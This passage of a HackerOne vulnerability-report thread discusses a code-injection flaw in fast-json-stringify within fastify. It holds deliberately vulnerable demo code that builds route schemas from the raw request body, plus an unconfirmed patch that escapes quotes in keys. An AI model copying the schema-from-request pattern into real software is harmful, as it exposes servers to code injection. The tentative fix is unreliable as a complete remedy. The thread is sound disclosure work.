cases.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-04-11T12:08:25.531Z","updated_at":"2019-04-11T12:08:25.531Z","actor":{"username":"mcollina","cleared":false,"url":"/mcollina","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/230/980/61a26e6fa4ec002fca494b3b7b43aa251eef3453_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4540063,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hello Matteo,\n\nI am happy to hear that _by default_ it's not possible to (re)define the schema with simple HTTP request.\nHowever, at the moment nothing prevents a _bad_ developer to implement such code (_that should not be vulnerable to arbitrary code execution_) and effectively making the vulnerability exploitable from the network. The fact that some requirement has to be met in order to make the issue exploitable, just lowers the likelihood and risk associated with it, but it's doesn't deprecate the vulnerability to \"bad bug\". Additionally the issue is present in a library used by `fastify`, namely `json-fast-stringify`, that it can be used in other, unintended ways, compared to `fastify` use cases. The ideal solution will be making the issue not exploitable in all the possible scenarios, as marking it as `WONTFIX` will leave this bug dormant.\n\n```javascript\nconst fastify = require('fastify')()\n\nfastify.route({\n  method: 'POST',\n  url: '/create-vulnerable-route',\n  schema: {\n    body: {\n      type: 'object',\n      properties: {\n        greeting: 'greetings#',\n        timestamp: { type: 'number' }\n      },\n      patternProperties: {\n        '.*vuln$': 'string'\n      },\n    }\n  },\n  handler: (request, reply) =\u003e {\n      const random = Math.floor(Math.random() * 100)\n      fastify.addSchema({\n        $id: 'greetings',\n        type: 'object',\n        properties: {\n            hello: { type: 'string' }\n        }\n    })\n\n    fastify.route({\n        method: 'POST',\n        url: `/vulnerable-route${random}`,\n        schema: JSON.parse(request.body),\n        handler: () =\u003e {}\n    })\n\n    reply.send(`Route /vulnerable-route${random} was successfully created!`)\n  }\n})\n```","markdown_message":"\u003cp\u003eHello Matteo,\u003c/p\u003e\n\n\u003cp\u003eI am happy to hear that \u003cu\u003eby default\u003c/u\u003e it\u0026#39;s not possible to (re)define the schema with simple HTTP request.\u003cbr\u003e\nHowever, at the moment nothing prevents a \u003cu\u003ebad\u003c/u\u003e developer to implement such code (\u003cu\u003ethat should not be vulnerable to arbitrary code execution\u003c/u\u003e) and effectively making the vulnerability exploitable from the network. The fact that some requirement has to be met in order to make the issue exploitable, just lowers the likelihood and risk associated with it, but it\u0026#39;s doesn\u0026#39;t deprecate the vulnerability to \u0026quot;bad bug\u0026quot;. Additionally the issue is present in a library used by \u003ccode\u003efastify\u003c/code\u003e, namely \u003ccode\u003ejson-fast-stringify\u003c/code\u003e, that it can be used in other, unintended ways, compared to \u003ccode\u003efastify\u003c/code\u003e use cases. The ideal solution will be making the issue not exploitable in all the possible scenarios, as marking it as \u003ccode\u003eWONTFIX\u003c/code\u003e will leave this bug dormant.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"kd\"\u003econst\u003c/span\u003e \u003cspan class=\"nx\"\u003efastify\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003erequire\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003efastify\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)()\u003c/span\u003e\n\n\u003cspan class=\"nx\"\u003efastify\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eroute\u003c/span\u003e\u003cspan class=\"p\"\u003e({\u003c/span\u003e\n  \u003cspan class=\"na\"\u003emethod\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003ePOST\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n  \u003cspan class=\"na\"\u003eurl\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e/create-vulnerable-route\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n  \u003cspan class=\"na\"\u003eschema\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"na\"\u003ebody\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n      \u003cspan class=\"na\"\u003etype\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003eobject\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n      \u003cspan class=\"na\"\u003eproperties\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"na\"\u003egreeting\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003egreetings#\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n        \u003cspan class=\"na\"\u003etimestamp\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e \u003cspan class=\"na\"\u003etype\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003enumber\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n      \u003cspan class=\"p\"\u003e},\u003c/span\u003e\n      \u003cspan class=\"na\"\u003epatternProperties\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e.*vuln$\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003estring\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\n      \u003cspan class=\"p\"\u003e},\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n  \u003cspan class=\"p\"\u003e},\u003c/span\u003e\n  \u003cspan class=\"na\"\u003ehandler\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003erequest\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003ereply\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n      \u003cspan class=\"kd\"\u003econst\u003c/span\u003e \u003cspan class=\"nx\"\u003erandom\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003eMath\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003efloor\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nb\"\u003eMath\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003erandom\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e \u003cspan class=\"mi\"\u003e100\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n      \u003cspan class=\"nx\"\u003efastify\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eaddSchema\u003c/span\u003e\u003cspan class=\"p\"\u003e({\u003c/span\u003e\n        \u003cspan class=\"na\"\u003e$id\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003egreetings\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n        \u003cspan class=\"na\"\u003etype\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003eobject\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n        \u003cspan class=\"na\"\u003eproperties\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n            \u003cspan class=\"na\"\u003ehello\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e \u003cspan class=\"na\"\u003etype\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003estring\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n        \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e})\u003c/span\u003e\n\n    \u003cspan class=\"nx\"\u003efastify\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eroute\u003c/span\u003e\u003cspan class=\"p\"\u003e({\u003c/span\u003e\n        \u003cspan class=\"na\"\u003emethod\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003ePOST\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n        \u003cspan class=\"na\"\u003eurl\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e`/vulnerable-route\u003c/span\u003e\u003cspan class=\"p\"\u003e${\u003c/span\u003e\u003cspan class=\"nx\"\u003erandom\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e`\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n        \u003cspan class=\"na\"\u003eschema\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"nx\"\u003eJSON\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eparse\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003erequest\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ebody\u003c/span\u003e\u003cspan class=\"p\"\u003e),\u003c/span\u003e\n        \u003cspan class=\"na\"\u003ehandler\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"p\"\u003e()\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan class=\"p\"\u003e{}\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e})\u003c/span\u003e\n\n    \u003cspan class=\"nx\"\u003ereply\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003esend\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e`Route /vulnerable-route\u003c/span\u003e\u003cspan class=\"p\"\u003e${\u003c/span\u003e\u003cspan class=\"nx\"\u003erandom\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e was successfully created!`\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n  \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003cspan class=\"p\"\u003e})\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","automated_response":false,"created_at":"2019-04-11T15:41:47.572Z","updated_at":"2019-04-11T15:41:47.572Z","actor":{"username":"phra","cleared":false,"url":"/phra","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/201/213/71f68147b3cb0e1d6e7e39953fc2c4822d04d338_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4542445,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"The code you provided crash at startup. The following code is closer to what you intended to do, but it crashes as well whenever `route` is called, no response is sent to the server, and fast-json-stringify is not colled.\n\n```js\nconst fastify = require('fastify')()\n\nfastify.route({\n  method: 'POST',\n  url: '/',\n  handler: (request, reply) =\u003e {\n    const random = Math.floor(Math.random() * 100)\n\n    fastify.route({\n        method: 'POST',\n        url: `/vulnerable-route${random}`,\n        schema: request.body,\n        handler: () =\u003e {}\n    })\n\n    reply.send(`Route /vulnerable-route${random} was successfully created!`)\n  }\n})\n\nfastify.listen(3000)\n```","markdown_message":"\u003cp\u003eThe code you provided crash at startup. The following code is closer to what you intended to do, but it crashes as well whenever \u003ccode\u003eroute\u003c/code\u003e is called, no response is sent to the server, and fast-json-stringify is not colled.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"kd\"\u003econst\u003c/span\u003e \u003cspan class=\"nx\"\u003efastify\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003erequire\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003efastify\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)()\u003c/span\u003e\n\n\u003cspan class=\"nx\"\u003efastify\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eroute\u003c/span\u003e\u003cspan class=\"p\"\u003e({\u003c/span\u003e\n  \u003cspan class=\"na\"\u003emethod\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003ePOST\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n  \u003cspan class=\"na\"\u003eurl\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e/\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n  \u003cspan class=\"na\"\u003ehandler\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003erequest\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003ereply\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"kd\"\u003econst\u003c/span\u003e \u003cspan class=\"nx\"\u003erandom\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003eMath\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003efloor\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nb\"\u003eMath\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003erandom\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e \u003cspan class=\"mi\"\u003e100\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\n    \u003cspan class=\"nx\"\u003efastify\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eroute\u003c/span\u003e\u003cspan class=\"p\"\u003e({\u003c/span\u003e\n        \u003cspan class=\"na\"\u003emethod\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003ePOST\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n        \u003cspan class=\"na\"\u003eurl\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e`/vulnerable-route\u003c/span\u003e\u003cspan class=\"p\"\u003e${\u003c/span\u003e\u003cspan class=\"nx\"\u003erandom\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e`\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n        \u003cspan class=\"na\"\u003eschema\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"nx\"\u003erequest\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ebody\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n        \u003cspan class=\"na\"\u003ehandler\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"p\"\u003e()\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan class=\"p\"\u003e{}\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e})\u003c/span\u003e\n\n    \u003cspan class=\"nx\"\u003ereply\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003esend\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e`Route /vulnerable-route\u003c/span\u003e\u003cspan class=\"p\"\u003e${\u003c/span\u003e\u003cspan class=\"nx\"\u003erandom\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e was successfully created!`\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n  \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003cspan class=\"p\"\u003e})\u003c/span\u003e\n\n\u003cspan class=\"nx\"\u003efastify\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003elisten\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e3000\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","automated_response":false,"created_at":"2019-04-11T19:35:19.514Z","updated_at":"2019-04-11T19:35:19.514Z","actor":{"username":"mcollina","cleared":false,"url":"/mcollina","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/230/980/61a26e6fa4ec002fca494b3b7b43aa251eef3453_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4542502,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Can you please check if the following solves all cases:\n\n```js\ndiff --git a/index.js b/index.js\nindex b6bbe4f..c33b66e 100644\n--- a/index.js\n+++ b/index.js\n@@ -119,6 +119,8 @@ function build (schema, options) {\n   }\n \n   dependenciesName.push(code)\n+\n+  console.log(code)\n   return (Function.apply(null, dependenciesName).apply(null, dependencies))\n }\n \n@@ -491,6 +493,10 @@ function refFinder (ref, schema, externalSchema) {\n   return (new Function('schema', code))(schema)\n }\n \n+function sanitizeKey (key) {\n+  return key.replace(/([^\\\\])\\'/g, '$1\\\\\\'')\n+}\n+\n function buildCode (schema, code, laterCode, name, externalSchema, fullSchema) {\n   Object.keys(schema.properties || {}).forEach((key, i, a) =\u003e {\n     if (schema.properties[key]['$ref']) {\n@@ -502,12 +508,13 @@ function buildCode (schema, code, laterCode, name, externalSchema, fullSchema) {\n \n     var type = schema.properties[key].type\n     var nullable = schema.properties[key].nullable\n+    var sanitized = sanitizeKey(key)\n \n     if (nullable) {\n       code += `\n-        if (obj['${key}'] === null) {\n+        if (obj['${sanitized}'] === null) {\n           ${addComma}\n-          json += '${$asString(key)}:null'\n+          json += '${$asString(sanitized)}:null'\n           var rendered = true\n         } else {\n       `\n@@ -515,10 +522,10 @@ function buildCode (schema, code, laterCode, name, externalSchema, fullSchema) {\n \n     if (type === 'number') {\n       code += `\n-          var t = Number(obj['${key}'])\n+          var t = Number(obj['${sanitized}'])\n           if (!isNaN(t)) {\n             ${addComma}\n-            json += '${$asString(key)}:' + t\n+            json += '${$asString(sanitized)}:' + t\n       `\n     } else if (type === 'integer') {\n       code += `\n@@ -526,25 +533,25 @@ function buildCode (schema, code, laterCode, name, externalSchema, fullSchema) {\n       `\n       if (isLong) {\n         code += `\n-            if (isLong(obj['${key}'])) {\n+            if (isLong(obj['${sanitized}'])) {\n               ${addComma}\n-              json += '${$asString(key)}:' + obj['${key}'].toString()\n+              json += '${$asString(sanitized)}:' + obj['${sanitized}'].toString()\n               rendered = true\n             } else {\n-              var t = Number(obj['${key}'])\n+              var t = Number(obj['${sanitized}'])\n               if (!isNaN(t)) {\n                 ${addComma}\n-                json += '${$asString(key)}:' + t\n+                json += '${$asString(sanitized)}:' + t\n                 rendered = true\n               }\n             }\n         `\n       } else {\n         code += `\n-            var t = Number(obj['${key}'])\n+            var t = Number(obj['${sanitized}'])\n             if (!isNaN(t)) {\n               ${addComma}\n-              json += '${$asString(key)}:' + t\n+              json += '${$asString(sanitized)}:' + t\n               rendered = true\n             }\n         `\n@@ -554,7 +561,7 @@ function buildCode (schema, code, laterCode, name, externalSchema, fullSchema) {\n       `\n     } else {\n       code += `\n-        if (obj['${key}'] !== undefined) {\n+        if (obj['${sanitized}'] !== undefined) {\n           ${addComma}\n           json += '${$asString(key)}:'\n         `\n@@ -569,12 +576,12 @@ function buildCode (schema, code, laterCode, name, externalSchema, fullSchema) {\n       code += `\n       } else {\n         ${addComma}\n-        json += '${$asString(key)}:${JSON.stringify(defaultValue).replace(/'/g, '\\'')}'\n+        json += '${$asString(sanitized)}:${JSON.stringify(defaultValue).replace(/'/g, '\\'')}'\n       `\n     } else if (schema.required \u0026\u0026 schema.required.indexOf(key) !== -1) {\n       code += `\n       } else {\n-        throw new Error('${key} is required!')\n+        throw new Error('${sanitized} is required!')\n       `\n     }\n ```","markdown_message":"\u003cp\u003eCan you please check if the following solves all cases:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"nx\"\u003ediff\u003c/span\u003e \u003cspan class=\"o\"\u003e--\u003c/span\u003e\u003cspan class=\"nx\"\u003egit\u003c/span\u003e \u003cspan class=\"nx\"\u003ea\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"nx\"\u003eindex\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ejs\u003c/span\u003e \u003cspan class=\"nx\"\u003eb\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"nx\"\u003eindex\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ejs\u003c/span\u003e\n\u003cspan class=\"nx\"\u003eindex\u003c/span\u003e \u003cspan class=\"nx\"\u003eb6bbe4f\u003c/span\u003e\u003cspan class=\"p\"\u003e..\u003c/span\u003e\u003cspan class=\"nx\"\u003ec33b66e\u003c/span\u003e \u003cspan class=\"mi\"\u003e100644\u003c/span\u003e\n\u003cspan class=\"o\"\u003e---\u003c/span\u003e \u003cspan class=\"nx\"\u003ea\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"nx\"\u003eindex\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ejs\u003c/span\u003e\n\u003cspan class=\"o\"\u003e+++\u003c/span\u003e \u003cspan class=\"nx\"\u003eb\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"nx\"\u003eindex\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ejs\u003c/span\u003e\n\u003cspan class=\"p\"\u003e@@\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"mi\"\u003e119\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"mi\"\u003e6\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e\u003cspan class=\"mi\"\u003e119\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"mi\"\u003e8\u003c/span\u003e \u003cspan class=\"p\"\u003e@@\u003c/span\u003e \u003cspan class=\"kd\"\u003efunction\u003c/span\u003e \u003cspan class=\"nx\"\u003ebuild\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eschema\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003eoptions\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n   \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\n   \u003cspan class=\"nx\"\u003edependenciesName\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003epush\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ecode\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003cspan class=\"o\"\u003e+\u003c/span\u003e\n\u003cspan class=\"o\"\u003e+\u003c/span\u003e  \u003cspan class=\"nx\"\u003econsole\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003elog\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ecode\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n   \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nb\"\u003eFunction\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eapply\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kc\"\u003enull\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003edependenciesName\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"nx\"\u003eapply\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kc\"\u003enull\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003edependencies\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e\n \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\n\u003cspan class=\"p\"\u003e@@\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"mi\"\u003e491\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"mi\"\u003e6\u003c/span\u003e 